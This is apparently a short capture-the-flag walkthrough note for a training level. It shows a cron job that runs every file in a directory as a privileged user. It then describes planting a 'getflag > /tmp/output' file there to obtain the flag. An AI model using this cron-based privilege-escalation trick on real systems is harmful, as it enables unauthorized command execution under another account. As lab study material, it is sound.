cat /var/mail/level05 -> */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

# We see a cron table, that may activate every 2min

cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i") # Exec file "$i" then delete
	rm -f "$i"
done

# We test, create a file containing : getflag > /tmp/output
# the file is deleted 🥵 and we cat the file /tmp/output, OMG THE FLAG IS IN
